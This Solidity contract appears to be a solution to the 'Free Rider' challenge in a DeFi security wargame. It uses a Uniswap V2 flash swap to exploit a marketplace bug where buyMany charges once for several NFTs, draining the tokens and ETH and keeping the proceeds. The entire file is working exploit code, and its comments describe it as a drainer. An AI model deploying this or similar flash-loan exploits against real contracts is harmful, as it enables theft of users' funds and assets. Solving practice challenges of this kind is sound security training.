// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';

import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IERC20.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';

import "./IFreeRiderNFTMarketplace.sol";


interface IERC721 {
	function setApprovalForAll(address operator, bool _approved) external;
	function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

contract FreeRiderDrainer is IUniswapV2Callee {
	address immutable factory;
	uint public constant MIN_WETH = 15 ether;
	IFreeRiderNFTMarketplace public marketplace;
	IERC721 nft;
	address buyerContractAddress;

    constructor(address _factory, address _marketplace, address _nftAddress, address _buyerContractAddress) public payable {
        factory = _factory;
        marketplace = IFreeRiderNFTMarketplace(_marketplace);
        nft = IERC721(_nftAddress);
        buyerContractAddress = _buyerContractAddress;
    }

	receive() external payable {}

    // gets WETH via a V2 flash swap,
    // drains Free Rider tokens
    // repays V2, and keeps the rest!
    // amount0 is assumed to be WETH amount
    // must transfer 0.1 ether to this contract previously
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
    	require(amount0 > 0, "Weth amount is not greater than 0");
    	require(amount0 >= 2*MIN_WETH, "Weth amount is not enough");
    	require(amount1 == 0, "Token amount is not equal to 0");
    	uint amountRequired = amount0*1000/996;
    	IWETH WETH;
    	{
    	address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        WETH = IWETH(token0);
        assert(msg.sender == UniswapV2Library.pairFor(factory, token0, token1));
        }
        WETH.withdraw(2*MIN_WETH);

        uint[] memory tokenIds = new uint[](6);
        for(uint i = 0; i < 6; i++) {
        	tokenIds[i] = i;
        }
        marketplace.buyMany{value: MIN_WETH}(
            tokenIds
        );

        uint[] memory tokenIds2 = new uint[](2);
        uint[] memory prices = new uint[](2);
        tokenIds2[0] = 0;
        tokenIds2[1] = 1;
        prices[0] = MIN_WETH;
        prices[1] = MIN_WETH;

        nft.setApprovalForAll(address(marketplace), true);

        marketplace.offerMany(
            tokenIds2,
            prices
        );

        marketplace.buyMany{value: MIN_WETH}(
            tokenIds2
        );

        //giveback
        WETH.deposit{value: amountRequired }();
        assert(WETH.transfer(msg.sender, amountRequired)); // return WETH to V2 pair

        for (uint id = 0; id < 6; id++) {
            nft.safeTransferFrom(address(this), buyerContractAddress, id);
        }


    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes calldata
    ) 
        external
        returns (bytes4) 
    {
    	return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}